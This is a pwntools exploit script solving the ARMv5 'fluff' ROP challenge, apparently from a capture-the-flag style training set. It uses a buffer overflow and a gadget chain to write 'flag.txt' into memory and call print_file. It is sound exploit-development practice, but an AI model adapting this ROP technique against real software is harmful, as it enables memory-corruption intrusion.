#!/usr/bin/env python3
from pwn import *
import os

os.environ["QEMU_LD_PREFIX"] = "/usr/arm-linux-gnueabi"

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'fluff_armv5')

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# ./fluff_armv5_exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

padding = b'A' * 36

# ropper --arch ARM --file fluff_armv5
# 0x000105ec: pop {r0, r1, r3}; bx r1;
# 0x00010658: pop {r4, r5, r6, r7, r8, sb, sl, pc};
POP_R0_R1_R3_BX_R1 = p32(0x105ec)
POP_R45678 = p32(0x10658)
# ropper --arch ARMTHUMB --file fluff_armv5 --inst-count 8
# 0x000103e8 (0x000103e9): str r7, [r3, #0x54]; str r6, [r5, #0x44]; bx r0;
# address shall be odd to enter "thumb" mode
STR_R3 = p32(0x103e9)

# "flag.txt" string
FLAG_STR = p32(int.from_bytes(b"flag", 'little'))
TXT_STR = p32(int.from_bytes(b".txt", 'little'))

# 0x00001024    0x8 0x00021024    0x8 -rw- 0x3   PROGBITS    .data
DATA_ADDR = 0x21024

# 0x000104b0    1     12 sym.imp.print_file
PR_FILE = p32(0x104b0)

payload = padding
payload += POP_R45678 + p32(0xa5) + p32(DATA_ADDR - 0x44)
payload += FLAG_STR + TXT_STR + 3*p32(0xa5)
payload += POP_R0_R1_R3_BX_R1 + POP_R0_R1_R3_BX_R1 + STR_R3 + p32(DATA_ADDR + 4 - 0x54)
payload += p32(DATA_ADDR) + PR_FILE + p32(0xa5)

io = start()

io.recvuntil(b"> ")
io.sendline(payload)

io.interactive()
